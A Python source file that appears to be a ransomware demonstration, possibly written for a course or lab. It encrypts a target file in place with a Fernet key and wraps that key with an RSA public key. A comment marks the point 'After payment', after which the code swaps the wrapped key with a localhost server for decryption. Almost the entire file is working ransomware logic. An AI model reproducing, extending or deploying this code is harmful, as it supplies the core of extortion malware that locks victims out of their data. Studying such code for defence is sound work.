import socket
import struct

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

HOST = '127.0.0.1'
PORT = 65432

def decryptFile(file_path):
    # Load the symmetric key
    with open('symmetric_key.key', 'rb') as key_file:
        symmetric_key = key_file.read()

    fernet_instance = Fernet(symmetric_key)

    # Decrypt and save the file
    with open(file_path, 'rb') as file:
        file_data = file.read()
        decrypted_data = fernet_instance.decrypt(file_data)

    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
    


def sendEncryptedKey(ekey_path):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        
        # Load the encrypted key
        with open(ekey_path, 'rb') as ekey_file:
            encrypted_key = ekey_file.read()
        
        # Send size (8 bytes) + encrypted key
        sock.sendall(struct.pack('!Q', len(encrypted_key)))
        sock.sendall(encrypted_key)

        # Receive the decrypted symmetric key (first receive the size)
        raw_size = sock.recv(8)
        if len(raw_size) < 8:
            raise ValueError('Errore nella ricezione della dimensione della risposta')
        
        key_size = struct.unpack('!Q', raw_size)[0]

        symmetric_key = b''
        while len(symmetric_key) < key_size:
            chunk = sock.recv(1024)
            if not chunk:
                break
            symmetric_key += chunk

        # save the symmetric_ley
        with open('symmetric_key.key', 'wb') as key_file:
            key_file.write(symmetric_key)
    
def encryptFile(file_path):
    # Generate the symmetric key
    symmetric_key = Fernet.generate_key()
    fernet_instance = Fernet(symmetric_key)

    # Load the public key
    with open('../../keys/public_key.key', 'rb') as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(), backend=default_backend()
        )
    
    # Encrypt and save the symmetric key
    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    with open('encrypted_symmetric_key.key', 'wb') as ekey_file:
        ekey_file.write(encrypted_symmetric_key)

    # Encrypt and save the file
    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = fernet_instance.encrypt(file_data)

    with open(file_path, 'wb') as efile:
        efile.write(encrypted_data)

    # ================================================= #
    # After payment                                     #
    # ================================================= #

    # Send the encrypted key to the server for the decryption
    sendEncryptedKey('encrypted_symmetric_key.key')

if __name__ == '__main__':
    file_path = 'files/file_to_encrypt.txt'
    encryptFile(file_path)
    decryptFile(file_path)